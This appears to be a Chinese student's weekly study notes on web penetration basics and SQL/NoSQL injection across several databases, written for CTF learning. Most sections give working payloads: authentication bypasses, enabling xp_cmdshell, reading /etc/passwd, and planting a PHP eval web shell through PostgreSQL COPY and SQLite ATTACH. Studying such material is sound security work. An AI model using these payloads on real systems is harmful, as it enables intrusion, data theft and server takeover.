# <font style="color:rgb(38, 38, 38);">完成事项</font>
1. web渗透基础知识
2. sql注入进阶的补充
# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
1. 比赛:unictf
2. 继续学习:web渗透
# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
### 一.基础知识
二级域名：在主域名前加上一个或多个子域名组成的域名，如：www.example.com中的“www”就是二级域名

三级域名：在二级域名前加上一个或多个子域名组成的域名，如：blog.shop.example.com中的“blog”就是三级域名

TTL(Time To Live)：生效时间，DNS记录在DNS服务器中缓存的时间，单位为秒

hosts文件：操作系统用来将主机名映射到IP地址的一个文本文件，通常位于系统目录下
>正常情况下，DNS解析会优先查询hosts文件，如果没有再查询网上的DNS服务器，利用此点可进行DNS劫持:在hosts里添加一条记录，可以让某个域名解析到指定的IP地址。

CDN(Content Delivery Network)：内容分发网络，通过在全球各地部署节点服务器，将用户的请求就近分配到距离最近的节点服务器上，从而提高访问速度和稳定性。**节点服务器仅仅缓存源站的内容，并不存储源站的全部数据。**

WEB的组成:
- 网站源码
- 数据库
- 中间件(搭建平台):位于服务器与网站源码之间，负责处理客户端请求并与数据库交互，如Apache、Nginx、Tomcat等
- 操作系统
### 二. SQL注入进阶
#### 一. mysql注入
###### 1.模糊查询
使用LIKE关键字进行模糊查询，%表示任意字符序列，_表示单个任意字符
```sql
SELECT * FROM users WHERE username LIKE 'a%'; -- 以a开头
SELECT * FROM users WHERE username LIKE '%a'; -- 以a结尾
SELECT * FROM users WHERE username LIKE '%a%'; -- 包含a
SELECT * FROM users WHERE username LIKE 'a_a'; -- 第二个字符为任意字符
``` 

###### 2.hp头部注入
网页后端会接受数据包数据并查询，比如使用php的$_SERVER['HTTP_USER_AGENT']获取User-Agent头信息，可以通过修改数据包头信息进行注入
常用server语句:
```php
$_SERVER['HTTP_USER_AGENT'];
// 注入点在User-Agent头
$_SERVER['HTTP_REFERER'];
// 注入点在Referer头
$_SERVER['HTTP_COOKIE'];
// 注入点在Cookie头
$_SERVER['REMOTE_ADDR'];
// 注入点在Ip地址
```
###### 3.json注入
多用于app接口请求，数据格式为json，可以通过修改json数据或POST请求进行注入

```php
SELECT * FROM users WHERE username = '{$_POST['username']}' AND password = '{$_POST['password']}'

# {}代表json数据
```
```json
{
  "username": "admin' OR '1'='1",
  "password": "password"
}
```
###### 4.堆叠注入
指可以用分号;一次写入多条sql语句的注入方式
但仅限于以下环境:
> PHP环境的mysqli_multi_query()函数
> 搭载PDO(PHP Data Objects)驱动默认支持
包含以下特征:
含有使用冒号:或问号?开头的占位符
报错标志:Fatal error: Uncaught PDOException: SQLSTATE[HY000]...

堆叠注入用于不同情况:
+ 插入，删除，更新数据
```sql
-1'; INSERT INTO users (username, password) VALUES ('hacker', 'hacked'); --
```
+ 当select被禁用时，可以用hex绕过
```sql
1'; 
SET @sql=0x73656c65637420666c61672066726f6d20666c61675f7461626c65; 
# @代表用户自定义变量 
PREPARE stmt FROM @sql; 
# 准备一条名为stmt的预编译语句，会自动解码@sql中的十六进制字符串
EXECUTE stmt;--+
# 执行预编译语句
```
#### 二. 其他数据库
>先用sqlmap探测数据库类型，再使用对应的注入语法
###### 1. access
access为单库数据库，故没有database这一说法，并且无法使用information_schema。这意味着无法通过注入语句获取数据库中的表名和列名，故此类题多使用字典爆破

基础语句
```sql
猜表名
and exists (select * from 表名)
猜列名：
and exists (select 字段 from 表名)
查询：
select name,password,id from user
猜长度:
and (select top 1 len(列名)from 表名)>N
# access无法使用limit，故使用top取数据，可以搭配order by desc
```
基本流程:
1. 判断注入点
2. exists (select * from 表名)爆出表名
3. select 1,2,3...from 表名爆出网页可显总字段数
4. 偏移注入爆出该表字段
+ cookie注入

access数据库常见于asp网站，且多通过cookie传递用户信息
由于cookie中不允许使用特殊符号，故需要对注入语句进行url编码。使用函数escape()进行url编码

控制台:
```sql
document.cookie="id="+escape("payload")
```
+ 偏移注入
光用select获取的是后台总字段数，并非目标表的字段
我们可以用表名.*代替目标表的全部字段
我们可以
```sql
select admin.*,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from admin
select admin.*,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from admin
select admin.*,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from admin
...
```
爆出目标表字段数
如果恰好admin.*所在位数为可显字段位，则字段可以直接显示
###### 2.sql sever(mssql)
语句与mysql类似，但函数不同
```sql
sysobjects (存储表名)
syscolumns (存储列名)
db_name() (获取当前数据库名)
字符串拼接使用+号
@@version (获取数据库版本)
and 1=(select top 1 name from sysobjects where xtype='U') 
(mssql特有的报错注入,括号内语句的结果会被返回在报错中)
# xtype='U'表示用户表，xtype是sysobjects表中的对象类型
```
+ 高权攻击
>默认超级用户为sa

这是其他数据库和传统mysql不同之处，如果你拥有足够权限，可以直接读写服务器文件，或执行命令

常用sqlmap
```sql
--privileges     #查看用户权限
--is-dba      #是否是数据库管理员
--os-cmd="命令"   #执行系统命令
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/)  
```
手动注入

```sql
SELECT IS_SRVROLEMEMBER('sysadmin'); -- 判断当前用户是否为sysadmin返回1或0
SELECT USER_NAME();   -- 当前数据库内的用户名
EXEC xp_cmdshell('命令'); -- 执行系统命令
```
xp_cmdshell默认是关闭的，可以通过以下语句开启
```sql
EXEC sp_configure 'show advanced options', 1; // 显示高级选项
RECONFIGURE; // RECONFIGURE 用于应用配置更改
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
###### 3.postgresql
该数据库支持information_schema
```sql
current_database() (获取当前数据库名)
current_user (获取当前数据库用户)
pg_sleep() (延时函数)
字符串拼接使用||号
```
常用注入手段
```sql
$quote/$$代替'
CHR() 代替字符
SELECT CHR(65)||CHR(66)||CHR(67)||CHR(68)||CHR(69)||CHR(70)||CHR(71)||CHR(72);
(SELECT 'ABCDEFGH';)
UNION SELECT NULL, NULL, NULL, version()--  常用null填充
```

+ 高权攻击
>默认超级用户为postgres

COPY命令支持读写文件
```sql
读取本地文件：
CREATE TABLE temp_table(content text); // 创建临时表
COPY temp_table FROM '/etc/passwd';
SELECT * FROM temp_table;

写入文件：
COPY (SELECT '<?php phpinfo(); ?>') TO '/var/www/html/shell.php';
```
###### 4. MongoDB
MongoDB为NoSQL数据库(非关系型)，数据以BSON(Binary JSON)格式存储。
>工具: NoSQLMap

常用操作符
```json
$ne：不等于 (Not Equal)
$gt：大于 (Greater Than)
$regex：正则表达式匹配
$where：执行JavaScript表达式
```
mongoDB支持不同后端语言，注入方式也略有不同
+ PHP
```php
$username = $_POST['username'];
$cursor = $collection->findOne(['username' => $username]);
```
php会把参数解析成关联数组，PHP 会把 username[\$ne]=1 解析成 ['username' => ['$ne' => '1']]。当这个数组传给 findOne 时，查找用户名不等于1的用户，从而绕过验证

+ JavaScript (Node.js)
Node.js的数据以JSON格式传递，可以注入json请求
```javascript
{ "username": "admin", "password": { "$gt": "" } }
// 这里的$gt操作符表示密码大于空字符，匹配所有非空密码
```

+ python

python允许用json.loads()解析json数据
```python
search_params = json.loads(request.data)
results = db.users.find(**search_params)
# *为字典序列解包，而**为关键词解包。如果json包含高级操作符($where)则会被直接执行
```
注入方式
```json
{"username": "admin", "password": {"$exists": true}}
// 确定是否有password字段，这里可以字典爆破
{ "username": "admin", "password": { "$where": "js代码" } }
```
+ 盲注

通过$regex进行正则匹配盲注
```json
{ "username": { "$regex": "^a" } } // 用户名以a开头
{ "username": { "$regex": "b$" } } // 用户名以b结尾
{ "username": { "$regex": "^.{3}$" } } // ^和$设定边界，判断用户名长度是否为3
```
如果不回显，利用$where和sleep()进行时间盲注
```json
{
  "username": "admin", 
  "$where": "if (this.password) sleep(5000)"
}
// 判断密码字段是否存在
{
  "username": "admin", 
  "$where": "if (this.password.length == 8) sleep(5000)"
}
// 判断密码长度是否为8，若是则延时5秒
{
  "username": "admin",
  "$where": "if (this.password.charCodeAt(0) == 97) sleep(5000)"
}
// 判断密码首字母ASCII码是否为97(a)，若是则延时5秒
// .charCodeAt()用于获取字符串中指定位置字符的Unicode编码
```
###### 5. sqlite
sqlite为轻量级数据库，常用于移动端设备
sqlite没有information_schema，所有表信息都存放在sqlite_master表中，table_name改为tbl_name，并且只支持/*和--两种注释方式
还有一点mysql没有的就是sql字段，这个字段包含了创建表的完整sql语句，里面储存了全部列名信息
```sql
# 查询字段数
-1' union select 1,2,3;
1' order by 3;

# 查版本
-1' union select 1,2,sqlite_version();

# 查询表名和列名 通过查询 sqlite_master 表来实现：
-1' union select 1,2,(select sql from sqlite_master limit 0,1),4;

# 当存在多个表时，我们可以用 limit 关键字逐行读取，也可以使用 group_concat 关键字进行聚合：
-1' union select 1,2,(select group_concat(sql) from sqlite_master),4;
-1' union select 1,2,tbl_name FROM sqlite_master limit 2 offset 1 --

# 查询数据
-1' union select 1,2,(select group_concat(username,password) from table_name),4;
```
+ 盲注

布尔类似于mysql
```sql
-1' or length((select group_concat(sql) from sqlite_master))> 12 /*
-1' or substr((select group_concat(sql) from sqlite_master),1,1)>'a'/*
-1' or substr((select group_concat(sql) from sqlite_master),1,1)<'a'/*
```
需要注意的是，sqlite没有延时函数，可以用randomblob()替代
>randomblob(N)函数会生成一个包含N个随机字节的BLOB对象，可以用来制造延时效果
```sql
-1' or (case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end)/*
# case than语句类似于if else语句
```
+ 高权攻击

ATTACH命令允许将外部数据库文件附加到当前数据库连接中，可以写入webshell
```sql
# 挂载一个新数据库文件到Web目录，创建一个名为shell.php的文件
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
# 在该数据库中建表，表名随意
CREATE TABLE pwn.hack (content TEXT);
# 向表中插入一句话木马
INSERT INTO pwn.hack (content) VALUES ('<?php @eval($_POST["cmd"]); ?>');
# 也可以hex形式写入
INSERT INTO pwn.hack (content) VALUES (X'3c3f70687020406576616c28245f504f53545b22636d64225d293b203f3e');
# 断开挂载，此时数据会自动写入磁盘文件
DETACH DATABASE pwn;
```
# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
学习了web渗透的基础知识和sql注入进阶，掌握了多种数据库的注入方法
# <font style="color:rgb(38, 38, 38);">杂项</font>
科目一已过，猛练科目二